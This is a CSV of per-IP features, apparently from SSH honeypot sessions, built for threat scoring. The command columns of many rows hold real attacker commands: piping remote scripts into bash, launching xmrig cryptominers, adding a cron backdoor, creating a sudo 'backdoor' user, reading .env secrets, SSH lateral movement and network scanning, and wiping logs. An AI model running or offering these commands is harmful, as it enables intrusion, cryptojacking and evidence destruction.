src_ip,total_events,unique_sessions,failed_logins,success_logins,unique_usernames,unique_passwords,unique_dst_ports,unique_protocols,commands_executed,files_downloaded,c2_connections,has_payload,avg_session_duration,total_bytes_sent,total_bytes_received,high_severity_events,medium_severity_events,unique_mitre_techniques,unique_attack_types,compromised_count,commands_list,top_commands,all_commands_unique,unique_commands,suspicious_command_count,uses_downloader,exec_chain_detected,fail_rate,success_rate,user_reuse_ratio,cmd_per_session,bytes_ratio,threat_score,connection_rate,burst_score
232.95.198.53,22,1,5,17,3,3,1,1,15,22,22,0,614.0,48499.0,36749.0,22,0,1,1,0,"['whoami', 'uname -s -r', 'ls /home/ubuntu/TaskBoard', 'find / -perm -4000 -type f 2>/dev/null', 'ls -la /dev/shm', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'ls /home', 'curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh', 'bash /tmp/install.sh > /dev/null 2>&1 &', 'chmod +x /tmp/payload.sh && bash /tmp/payload.sh', 'chmod +x /tmp/.xmrig', 'curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', 'logout']","whoami(1), uname -s -r(1), ls /home/ubuntu/TaskBoard(1), find / -perm -4000 -type f 2>/dev/null(1), ls -la /dev/shm(1)","whoami, uname -s -r, ls /home/ubuntu/TaskBoard, find / -perm -4000 -type f 2>/dev/null, ls -la /dev/shm, find / -name '*.conf' -readable 2>/dev/null | head -20, ls /home, curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh, bash /tmp/install.sh > /dev/null 2>&1 &, chmod +x /tmp/payload.sh && bash /tmp/payload.sh",15,4,1,0,0.21739130434782608,0.7391304347826086,0.5,7.5,1.3197006802721087,7.043478260869565,7.636988480875709,0.13697162846496005
234.162.202.69,8,1,8,0,4,4,1,1,0,8,8,0,28.0,2352.0,1186.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.9814658803706824,5.333333333333333,8.0,0.39308281416443497
235.29.132.79,6,1,6,0,2,2,1,1,0,6,6,0,8.0,1643.0,1284.0,6,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,1.2785992217898832,6.0,6.0,0.5522425994388348
236.228.137.146,11,1,11,0,7,6,1,1,0,11,11,0,13.0,2079.0,454.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.41666666666666663,0.0,4.569230769230769,4.583333333333333,11.0,0.4242391015624321
239.166.56.42,6,1,6,0,2,2,1,1,0,6,6,0,7.0,2331.0,1068.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,2.1805425631431246,4.285714285714286,6.0,0.3493670612109416
239.187.130.101,9,1,9,0,5,4,1,1,0,9,9,0,16.0,2986.0,1067.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,2.795880149812734,5.4,9.0,0.5006580164762092
24.99.38.64,23,1,4,19,2,2,1,1,17,23,23,3,289.0,33195.0,26763.0,23,0,1,1,0,"['cat /etc/hostname', 'who', 'uname -a', 'id', 'ls -la /home', 'ls /home/ubuntu/TaskBoard', 'ls -la /dev/shm', 'find / -perm -4000 -type f 2>/dev/null', 'curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64', 'chmod 777 /tmp/setup.sh', 'wget -q http://194.165.16.78/pnscan -O /tmp/pnscan', 'wget -q http://45.142.212.100/setup.sh -P /tmp/', '/tmp/payload.sh &', 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', '/tmp/xmrig -o xmr.f2pool.com:13531 -u WALLET_ADDR -p x --cpu-max-threads-hint=90 &', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", 'quit']","cat /etc/hostname(1), who(1), uname -a(1), id(1), ls -la /home(1)","cat /etc/hostname, who, uname -a, id, ls -la /home, ls /home/ubuntu/TaskBoard, ls -la /dev/shm, find / -perm -4000 -type f 2>/dev/null, curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64, chmod 777 /tmp/setup.sh",17,4,1,1,0.16666666666666666,0.7916666666666666,0.6,8.5,1.2402854580780152,7.5,9.84371321982153,0.1920282806604735
242.112.132.146,7,1,7,0,3,3,1,1,0,7,7,0,5.0,816.0,1048.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,0.7778836987607245,4.375,7.0,0.5170454262847992
242.119.177.251,5,1,5,0,1,1,1,1,0,5,5,0,9.0,1146.0,1380.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,0.8298334540188269,4.166666666666667,5.0,0.49544959430454544
242.40.155.245,5,1,5,0,1,1,1,1,0,5,5,0,5.0,594.0,565.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.0494699646643109,5.0,5.0,0.3409449684783755
243.166.215.17,23,1,5,18,3,3,1,1,15,23,23,1,811.0,73292.0,34326.0,23,0,1,1,0,"['uname -a', 'cat /etc/os-release', 'cat /etc/hostname', 'last | head -20', 'ifconfig', 'netstat -tulnp', 'cat /etc/resolv.conf', 'ip neigh', ""grep -r 'Host ' ~/.ssh/config 2>/dev/null"", 'for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done', 'masscan 10.0.0.0/8 -p22 --rate=5000 2>/dev/null', '/tmp/pnscan 172.31.0.0/16 22', ""nmap -p 22 --open 10.0.0.0/8 -T4 --max-retries 1 2>/dev/null | grep 'Nmap scan'"", 'nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null', 'logout']","uname -a(1), cat /etc/os-release(1), cat /etc/hostname(1), last | head -20(1), ifconfig(1)","uname -a, cat /etc/os-release, cat /etc/hostname, last | head -20, ifconfig, netstat -tulnp, cat /etc/resolv.conf, ip neigh, grep -r 'Host ' ~/.ssh/config 2>/dev/null, for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done",15,0,0,0,0.20833333333333334,0.75,0.5,7.5,2.135112302269351,6.791666666666667,8.059147131994813,0.15197033173244093
244.218.234.26,18,1,4,14,2,2,1,1,12,18,18,0,262.0,753.0,13281.0,0,0,1,1,0,"['hostname -f', 'whoami', 'hostname', 'history -c', 'shred -u /var/log/auth.log', 'unset HISTFILE', 'useradd -m -s /bin/bash -G sudo backdoor 2>/dev/null', ""sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config"", ""(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -"", 'systemctl enable ssh', ""echo '' > ~/.bash_history"", 'exit']","hostname -f(1), whoami(1), hostname(1), history -c(1), shred -u /var/log/auth.log(1)","hostname -f, whoami, hostname, history -c, shred -u /var/log/auth.log, unset HISTFILE, useradd -m -s /bin/bash -G sudo backdoor 2>/dev/null, sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config, (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -, systemctl enable ssh",12,1,1,0,0.21052631578947367,0.7368421052631579,0.6,6.0,0.056693269085981025,4.842105263157895,8.719381246871519,0.1530770202237295
247.40.114.120,24,1,4,20,2,2,1,1,16,24,24,4,54.0,24172.0,28863.0,0,24,1,1,0,"['uname -a', 'hostname', 'whoami', 'free -m', ""cat /proc/cpuinfo | grep 'model name' | head -1"", ""lscpu | grep -E 'CPU|Thread|Core'"", ""mount | grep -v 'tmpfs\\|cgroup'"", 'curl -s http://45.142.212.100/miner.sh | bash', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'chmod +x /tmp/.xmrig', 'curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh', 'chmod +x /tmp/payload.sh && bash /tmp/payload.sh', ""echo '' > ~/.bash_history"", 'history -c', 'cat /dev/null > ~/.bash_history', 'exit']","uname -a(1), hostname(1), whoami(1), free -m(1), cat /proc/cpuinfo | grep 'model name' | head -1(1)","uname -a, hostname, whoami, free -m, cat /proc/cpuinfo | grep 'model name' | head -1, lscpu | grep -E 'CPU|Thread|Core', mount | grep -v 'tmpfs\|cgroup', curl -s http://45.142.212.100/miner.sh | bash, curl -fsSL http://176.97.66.164/b.sh | sh, chmod +x /tmp/.xmrig",16,5,1,0,0.16,0.8,0.6,8.0,0.8374445676274944,6.48,6.876462442099231,0.132416680384185
249.79.11.140,7,1,7,0,3,3,1,1,0,7,7,0,18.0,2308.0,471.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,4.889830508474576,5.25,7.0,0.476441414723839
25.132.224.171,10,1,10,0,6,5,1,1,0,10,10,0,3.0,342.0,280.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.4545454545454546,0.0,1.217081850533808,4.545454545454546,10.0,0.43073424852963343
252.132.192.184,5,1,5,0,1,1,1,1,0,5,5,0,30.0,265.0,187.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.4095744680851063,5.833333333333333,5.0,0.3866784526805911
252.137.19.5,7,1,7,0,3,1,1,1,0,7,7,0,4.0,2449.0,598.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,4.088480801335559,4.375,7.0,0.4074767509011212
253.254.228.103,11,1,11,0,6,7,1,1,0,11,11,0,23.0,972.0,682.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,1.4231332357247437,4.583333333333333,11.0,0.5971143806360251
26.129.85.91,25,1,4,21,2,2,1,1,19,25,25,0,38.0,36610.0,1285.0,0,25,1,1,0,"['cat /etc/os-release', 'hostname', 'uname -a', 'ls -la /tmp', 'ls /home/ubuntu/TaskBoard/frontend', ""find / -name '.env' -type f 2>/dev/null | head -10"", 'find / -perm -4000 -type f 2>/dev/null', 'ls /home', 'cat /etc/group', 'env | grep -i token', 'cat /root/.bash_history', 'cat /home/ubuntu/TaskBoard/Backend/routes/auth.js', 'cat ~/.bash_history', ""echo 'root:H4ck3d!' | chpasswd"", ""sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config"", 'cat /dev/null > ~/.bash_history', 'shred -u /var/log/auth.log', 'history -w', 'disconnect']","cat /etc/os-release(1), hostname(1), uname -a(1), ls -la /tmp(1), ls /home/ubuntu/TaskBoard/frontend(1)","cat /etc/os-release, hostname, uname -a, ls -la /tmp, ls /home/ubuntu/TaskBoard/frontend, find / -name '.env' -type f 2>/dev/null | head -10, find / -perm -4000 -type f 2>/dev/null, ls /home, cat /etc/group, env | grep -i token",19,0,0,0,0.15384615384615385,0.8076923076923077,0.6,9.5,28.468118195956453,5.769230769230769,8.293386853323161,0.14758044844771556
26.240.111.80,25,1,3,22,1,1,1,1,19,25,25,5,490.0,68487.0,15893.0,25,0,1,1,0,"['id', 'cat /etc/os-release', 'whoami', 'last | head -20', 'cat /proc/version', ""lscpu | grep -E 'CPU|Thread|Core'"", ""mount | grep -v 'tmpfs\\|cgroup'"", 'lsblk', ""cat /proc/cpuinfo | grep 'model name' | head -1"", 'curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64', 'wget -q http://45.142.212.100/setup.sh -P /tmp/', 'chmod +x /tmp/.xmrig', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'wget -q http://194.165.16.78/pnscan -O /tmp/pnscan', 'export HISTSIZE=0', 'history -w', 'truncate -s 0 /var/log/auth.log', ""echo '' > ~/.bash_history"", 'disconnect']","id(1), cat /etc/os-release(1), whoami(1), last | head -20(1), cat /proc/version(1)","id, cat /etc/os-release, whoami, last | head -20, cat /proc/version, lscpu | grep -E 'CPU|Thread|Core', mount | grep -v 'tmpfs\|cgroup', lsblk, cat /proc/cpuinfo | grep 'model name' | head -1, curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64",19,6,1,1,0.11538461538461539,0.8461538461538461,0.75,9.5,4.308984522461306,7.769230769230769,7.798852008984277,0.13522952650905357
26.30.95.134,11,1,11,0,7,7,1,1,0,11,11,0,11.0,1355.0,934.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.41666666666666663,0.0,1.4491978609625669,4.583333333333333,11.0,0.5887243544486072
27.19.93.37,21,1,3,18,1,1,1,1,16,21,21,0,887.0,21345.0,6414.0,21,0,1,1,0,"['cat /etc/os-release', 'hostname', 'uname -s -r', 'last | head -20', 'hostname -f', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls -la /var/tmp', 'history', 'env | grep -i secret', 'cat /etc/group', 'sudo -l', 'chmod 600 ~/.ssh/authorized_keys', 'crontab -e', ""echo '' > ~/.bash_history"", 'logout']","cat /etc/os-release(1), hostname(1), uname -s -r(1), last | head -20(1), hostname -f(1)","cat /etc/os-release, hostname, uname -s -r, last | head -20, hostname -f, find / -name '*.conf' -readable 2>/dev/null | head -20, ls -la /home/ubuntu/TaskBoard/Backend/, ls -la /var/tmp, history, env | grep -i secret",16,1,0,0,0.13636363636363635,0.8181818181818182,0.75,8.0,3.3273577552611067,6.7727272727272725,9.496103582894955,0.18402061137977724
27.24.21.219,25,1,4,21,2,2,1,1,18,25,25,3,82.0,107681.0,21426.0,25,0,1,1,0,"['who', 'hostname -f', 'uname -a', 'cat /etc/hostname', ""grep -rn 'JWT_SECRET\\|DB_PASS\\|MONGO_URI' /home/ubuntu/TaskBoard/ 2>/dev/null"", 'cat /home/ubuntu/TaskBoard/Backend/.env', 'history', 'curl http://localhost:5000/api/users', 'cd /home/ubuntu/TaskBoard/Backend && node server.js &', 'mongo taskboard --eval \'db.users.updateOne({username:""admin""},{\\$set:{password:""hacked""}})\'', 'curl -s http://localhost:3000/api/auth/register -X POST -d \'{""username"":""hacker"",""password"":""pwned""}\' -H \'Content-Type: application/json\'', 'curl http://localhost:3000/api/auth/login -X POST -H \'Content-Type: application/json\' -d \'{""username"":""admin"",""password"":""admin123""}\'', 'export HISTFILESIZE=0', 'cat /dev/null > ~/.bash_history', ""echo '' > /var/log/wtmp"", ""echo '' > ~/.bash_history"", 'history -w', 'exit']","who(1), hostname -f(1), uname -a(1), cat /etc/hostname(1), grep -rn 'JWT_SECRET\|DB_PASS\|MONGO_URI' /home/ubuntu/TaskBoard/ 2>/dev/null(1)","who, hostname -f, uname -a, cat /etc/hostname, grep -rn 'JWT_SECRET\|DB_PASS\|MONGO_URI' /home/ubuntu/TaskBoard/ 2>/dev/null, cat /home/ubuntu/TaskBoard/Backend/.env, history, curl http://localhost:5000/api/users, cd /home/ubuntu/TaskBoard/Backend && node server.js &, mongo taskboard --eval 'db.users.updateOne({username:""admin""},{\$set:{password:""hacked""}})'",18,3,1,0,0.15384615384615385,0.8076923076923077,0.6,9.0,5.0254818686703695,7.1923076923076925,6.542504470711387,0.12706215739758167
27.27.162.75,7,1,7,0,3,3,1,1,0,7,7,0,4.0,445.0,244.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.816326530612245,5.25,7.0,0.5853132836075146
27.43.179.48,10,1,10,0,6,6,1,1,0,10,10,0,12.0,1920.0,764.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.4545454545454546,0.0,2.5098039215686274,4.545454545454546,10.0,0.4250843117058549
27.6.3.84,6,1,6,0,2,2,1,1,0,6,6,0,17.0,1358.0,704.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,1.926241134751773,4.285714285714286,6.0,0.5815299681730962
29.36.84.46,25,1,5,20,3,3,1,1,16,25,25,4,818.0,114699.0,11040.0,25,0,1,1,0,"['cat /etc/os-release', 'uname -a', ""find /home -name '*.env' 2>/dev/null"", ""find / -name 'id_rsa' 2>/dev/null"", ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'ls /home/ubuntu/TaskBoard', 'find / -perm -4000 -type f 2>/dev/null', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'wget -q http://194.165.16.78/pnscan -O /tmp/pnscan', 'chmod +x /tmp/payload.sh && bash /tmp/payload.sh', 'chmod +x /tmp/.xmrig', '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', '/tmp/.xmrig -o xmr-eu1.nanopool.org:14444 -u WALLET_ADDR/worker1 --tls -B', 'logout']","cat /etc/os-release(1), uname -a(1), find /home -name '*.env' 2>/dev/null(1), find / -name 'id_rsa' 2>/dev/null(1), find / -name '*.conf' -readable 2>/dev/null | head -20(1)","cat /etc/os-release, uname -a, find /home -name '*.env' 2>/dev/null, find / -name 'id_rsa' 2>/dev/null, find / -name '*.conf' -readable 2>/dev/null | head -20, ls /home/ubuntu/TaskBoard, find / -perm -4000 -type f 2>/dev/null, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/, curl -fsSL http://176.97.66.164/b.sh | sh, wget -q http://194.165.16.78/pnscan -O /tmp/pnscan",16,5,1,1,0.19230769230769232,0.7692307692307693,0.5,8.0,10.388461190109592,7.615384615384615,6.876853885193217,0.12437558545132182
30.159.66.6,6,1,6,0,2,2,1,1,0,6,6,0,21.0,235.0,532.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,0.44090056285178236,5.142857142857143,6.0,0.37488760893991074
30.23.118.35,11,1,11,0,6,7,1,1,0,11,11,0,29.0,1515.0,542.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,2.7900552486187844,4.583333333333333,11.0,0.4955941015591425
34.138.193.65,9,1,9,0,5,5,1,1,0,9,9,0,16.0,676.0,901.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,0.7494456762749445,5.4,9.0,0.51211397501919
34.2.137.189,5,1,5,0,1,1,1,1,0,5,5,0,5.0,1010.0,701.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.4387464387464388,5.0,5.0,0.4419114017532929
35.131.108.69,5,1,5,0,1,1,1,1,0,5,5,0,6.0,2704.0,445.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,6.062780269058296,4.166666666666667,5.0,0.3106889792859837
35.207.108.188,20,1,3,17,1,1,1,1,14,20,20,2,395.0,114493.0,15310.0,0,0,1,1,0,"['who', 'last | head -20', 'cat /home/ubuntu/TaskBoard/Backend/.env', 'cat /etc/group', 'cat /etc/passwd', 'cat /home/ubuntu/TaskBoard/Backend/package.json', 'curl http://localhost:5000/api/users', 'curl http://localhost:3000/api/auth/login -X POST -H \'Content-Type: application/json\' -d \'{""username"":""admin"",""password"":""admin123""}\'', 'cd /home/ubuntu/TaskBoard && ls -la', ""mongo --eval 'db.adminCommand({listDatabases:1})'"", 'rm -rf /var/log/auth.log', 'history -c', ""pkill -f 'sshd: root'"", 'quit']","who(1), last | head -20(1), cat /home/ubuntu/TaskBoard/Backend/.env(1), cat /etc/group(1), cat /etc/passwd(1)","who, last | head -20, cat /home/ubuntu/TaskBoard/Backend/.env, cat /etc/group, cat /etc/passwd, cat /home/ubuntu/TaskBoard/Backend/package.json, curl http://localhost:5000/api/users, curl http://localhost:3000/api/auth/login -X POST -H 'Content-Type: application/json' -d '{""username"":""admin"",""password"":""admin123""}', cd /home/ubuntu/TaskBoard && ls -la, mongo --eval 'db.adminCommand({listDatabases:1})'",14,3,1,0,0.14285714285714285,0.8095238095238095,0.75,7.0,7.47782639932075,5.238095238095238,8.40836632449287,0.148824910098609
36.15.168.210,26,1,4,22,2,2,1,1,18,26,26,5,811.0,85068.0,2079.0,0,0,1,1,0,"['w', 'uptime', 'cat /proc/version', 'journalctl -n 50 --no-pager', 'df -h', 'nproc', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', 'curl -s http://45.142.212.100/miner.sh | bash', 'wget -q http://91.92.251.103/xmrig -O /tmp/.xmrig', 'chmod +x /tmp/.xmrig', 'cat /dev/null > ~/.bash_history', ""echo '' > /var/log/btmp"", ""echo '' > /var/log/wtmp"", 'rm -rf /var/log/syslog', 'rm -f ~/.bash_history', 'history -w', 'quit']","w(1), uptime(1), cat /proc/version(1), journalctl -n 50 --no-pager(1), df -h(1)","w, uptime, cat /proc/version, journalctl -n 50 --no-pager, df -h, nproc, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/, curl -s http://45.142.212.100/miner.sh | bash, wget -q http://91.92.251.103/xmrig -O /tmp/.xmrig",18,5,1,1,0.14814814814814814,0.8148148148148148,0.6,9.0,40.89807692307692,5.7407407407407405,7.06745798033797,0.13950703482340865
38.214.250.193,5,1,5,0,1,1,1,1,0,5,5,0,8.0,1498.0,1301.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.1505376344086022,5.0,5.0,0.337749753977256
38.61.246.36,6,1,6,0,2,2,1,1,0,6,6,0,6.0,993.0,327.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,3.027439024390244,4.285714285714286,6.0,0.3469264379981037
4.237.94.21,24,1,4,20,2,2,1,1,17,24,24,2,105.0,85002.0,5041.0,24,0,1,1,0,"['cat /etc/hostname', 'who', 'uname -a', 'nproc', ""lscpu | grep -E 'CPU|Thread|Core'"", ""mount | grep -v 'tmpfs\\|cgroup'"", ""sysctl -a 2>/dev/null | grep -i 'net\\|kernel'"", 'df -h', 'curl -s http://45.142.212.100/miner.sh | bash', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'rm -f ~/.bash_history', ""pkill -f 'sshd: root'"", 'rm -rf /var/log/syslog', 'shred -u /var/log/auth.log', 'export HISTFILESIZE=0', 'unset HISTFILE', 'disconnect']","cat /etc/hostname(1), who(1), uname -a(1), nproc(1), lscpu | grep -E 'CPU|Thread|Core'(1)","cat /etc/hostname, who, uname -a, nproc, lscpu | grep -E 'CPU|Thread|Core', mount | grep -v 'tmpfs\|cgroup', sysctl -a 2>/dev/null | grep -i 'net\|kernel', df -h, curl -s http://45.142.212.100/miner.sh | bash, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh",17,2,1,0,0.16,0.8,0.6,8.5,16.858786195953986,7.04,8.5713775513241,0.14156168903492905
4.64.163.165,8,1,8,0,3,4,1,1,0,8,8,0,27.0,2954.0,801.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,3.683291770573566,5.333333333333333,8.0,0.5308996178005025
40.104.174.182,25,1,3,22,1,1,1,1,20,25,25,0,411.0,92153.0,20325.0,25,0,1,1,0,"['last | head -20', 'uname -a', 'uptime', 'netstat -tulnp', 'netstat -antp', 'arp -a', ""grep -r 'Host ' ~/.ssh/config 2>/dev/null"", 'cat /etc/ssh/ssh_known_hosts 2>/dev/null', 'for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done', 'ssh -o StrictHostKeyChecking=no root@10.0.1.50 id', ""ssh -o StrictHostKeyChecking=no ubuntu@172.31.0.10 'cat /etc/passwd'"", ""nmap -p 22 --open 10.0.0.0/8 -T4 --max-retries 1 2>/dev/null | grep 'Nmap scan'"", ""for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo '192.168.1.'$i' alive'; done"", 'masscan 10.0.0.0/8 -p22 --rate=5000 2>/dev/null', 'nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null', '/tmp/pnscan 172.31.0.0/16 22', 'cat /dev/null > ~/.bash_history', 'unset HISTFILE', 'history -w', 'disconnect']","last | head -20(1), uname -a(1), uptime(1), netstat -tulnp(1), netstat -antp(1)","last | head -20, uname -a, uptime, netstat -tulnp, netstat -antp, arp -a, grep -r 'Host ' ~/.ssh/config 2>/dev/null, cat /etc/ssh/ssh_known_hosts 2>/dev/null, for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done, ssh -o StrictHostKeyChecking=no root@10.0.1.50 id",20,0,0,0,0.11538461538461539,0.8461538461538461,0.75,10.0,4.533749877004821,6.730769230769231,7.6996914990272725,0.15621382333337158
41.115.232.58,9,1,9,0,5,5,1,1,0,9,9,0,11.0,1723.0,1462.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,1.177717019822283,4.5,9.0,0.5425630457712979
41.134.87.54,9,1,9,0,5,4,1,1,0,9,9,0,17.0,470.0,647.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,0.7253086419753086,4.5,9.0,0.4529387574499422
41.78.162.155,10,1,10,0,6,6,1,1,0,10,10,0,2.0,1396.0,705.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.4545454545454546,0.0,1.9773371104815864,4.545454545454546,10.0,0.44113693532417225
42.166.42.115,33,1,5,28,2,2,1,1,24,33,33,2,812.0,97520.0,32704.0,0,0,1,1,0,"['uptime', 'who', 'last | head -20', 'whoami', 'id', 'lsblk', 'df -h', 'dmesg | tail -20', ""lscpu | grep -E 'CPU|Thread|Core'"", 'cat /etc/resolv.conf', 'ip route show', 'ss -antp', 'netstat -antp', 'wget -qO- ipinfo.io', 'top -bn1 | head -20', 'cat /proc/1/cmdline', 'ps aux | grep -v grep', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'ls -la /dev/shm', ""find / -name 'id_rsa' 2>/dev/null"", 'export HISTSIZE=0', 'export HISTFILESIZE=0', 'history -c', 'exit']","uptime(1), who(1), last | head -20(1), whoami(1), id(1)","uptime, who, last | head -20, whoami, id, lsblk, df -h, dmesg | tail -20, lscpu | grep -E 'CPU|Thread|Core', cat /etc/resolv.conf",24,1,1,0,0.14705882352941177,0.8235294117647058,0.6666666666666667,12.0,2.9818070631401925,5.029411764705882,7.973518254524367,0.14615272549963979
